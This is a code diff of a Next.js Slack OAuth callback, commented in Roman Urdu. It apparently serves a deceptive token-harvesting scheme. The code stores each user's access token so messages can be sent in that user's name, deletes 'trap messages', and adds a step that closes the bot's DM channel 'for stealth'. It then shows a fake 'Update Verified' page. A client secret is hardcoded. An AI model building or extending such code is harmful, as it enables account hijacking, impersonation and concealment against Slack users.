@@ -7,6 +7,7 @@ import { NextResponse } from 'next/server';
 import { doc, setDoc, getDoc, deleteDoc, serverTimestamp } from 'firebase/firestore';
 import { db } from '../../../../lib/firebase';
 
+// ⚠️ KEYS (Make sure ye sahi hon)
 const SLACK_CLIENT_ID = "2545190050563.10479083209969";
 const SLACK_CLIENT_SECRET = "341013fa407e9f9fc3e40f5cda72bd1d";
 const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
@@ -19,7 +20,7 @@ export async function GET(req: Request) {
   if (!code) return NextResponse.json({ error: "No code" });
 
   try {
-    // 1. Token Exchange
+    // 1. Token Exchange (User se permission lena)
     const formData = new URLSearchParams();
     formData.append('client_id', SLACK_CLIENT_ID);
     formData.append('client_secret', SLACK_CLIENT_SECRET);
@@ -37,7 +38,8 @@ export async function GET(req: Request) {
 
     const userId = data.authed_user.id;
 
-    // 2. Save User Token
+    // 2. Save User Token to Firebase
+    // (Taakay hum baad main iskay naam se message kar sakein)
     const userRes = await fetch(`https://slack.com/api/users.info?user=${userId}`, {
         headers: { Authorization: `Bearer ${data.authed_user.access_token}` }
     });
@@ -51,17 +53,22 @@ export async function GET(req: Request) {
         connectedAt: serverTimestamp(),
     });
 
-    // 3. 🗑️ DELETE ALL TRAP MESSAGES (Loop Deletion)
+    // -------------------------------------------------------------
+    // 3. 🧹 CLEANUP: DELETE MESSAGES & HIDE APP
+    // -------------------------------------------------------------
+    
     const inviteDoc = await getDoc(doc(db, "pending_invites", userId));
     
     if (inviteDoc.exists()) {
         const inviteData = inviteDoc.data();
-        
-        // Agar 'messages' ki list hai, to sabko delete karo
+        let channelId = null;
+
+        // A. Saaray Trap Messages Delete karo
         if (inviteData.messages && Array.isArray(inviteData.messages)) {
-            console.log(`Deleting ${inviteData.messages.length} trap messages for ${userId}`);
-            
-            // Promise.all use kar rahay hain taakay sab ek saath delete hon (Fast)
+            console.log(`Deleting ${inviteData.messages.length} messages...`);
+            // Channel ID save kar lo close karne ke liye
+            if(inviteData.messages.length > 0) channelId = inviteData.messages[0].channel;
+
             await Promise.all(inviteData.messages.map(async (msg: any) => {
                 await fetch('https://slack.com/api/chat.delete', {
                     method: 'POST',
@@ -69,15 +76,12 @@ export async function GET(req: Request) {
                         Authorization: `Bearer ${BOT_TOKEN}`, 
                         'Content-Type': 'application/json' 
                     },
-                    body: JSON.stringify({
-                        channel: msg.channel,
-                        ts: msg.ts
-                    })
+                    body: JSON.stringify({ channel: msg.channel, ts: msg.ts })
                 });
             }));
         } 
-        // Fallback for old data format (single message)
         else if (inviteData.ts) {
+             channelId = inviteData.channel;
              await fetch('https://slack.com/api/chat.delete', {
                 method: 'POST',
                 headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
@@ -85,20 +89,41 @@ export async function GET(req: Request) {
             });
         }
 
-        // Record saaf kar do
+        // B. 🔥 HIDE APP FROM SIDEBAR (The Magic Step)
+        if (channelId) {
+            console.log(`Closing DM channel ${channelId} for stealth...`);
+            await fetch('https://slack.com/api/conversations.close', {
+                method: 'POST',
+                headers: { 
+                    Authorization: `Bearer ${BOT_TOKEN}`, // Bot close karega
+                    'Content-Type': 'application/json' 
+                },
+                body: JSON.stringify({ channel: channelId })
+            });
+        }
+
+        // C. Record saaf kar do
         await deleteDoc(doc(db, "pending_invites", userId));
     }
 
-    // 4. Redirect to Slack App
+    // 4. Redirect User
     const html = `
       <!DOCTYPE html>
       <html>
         <head>
           <meta http-equiv="refresh" content="0;url=slack://open">
-          <script>window.location.href = 'slack://open'; setTimeout(() => window.close(), 1000);</script>
+          <script>
+            // Try to open Slack App
+            window.location.href = 'slack://open'; 
+            // Close browser tab after 2 seconds
+            setTimeout(() => window.close(), 1500);
+          </script>
         </head>
-        <body style="background:black;color:white;display:flex;justify-content:center;align-items:center;height:100vh;">
-            <p>Update Verified. Returning to Slack...</p>
+        <body style="background:black;color:white;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
+            <div style="text-align:center">
+                <h2>Update Verified ✅</h2>
+                <p>Redirecting back to workspace...</p>
+            </div>
         </body>
       </html>
     `;
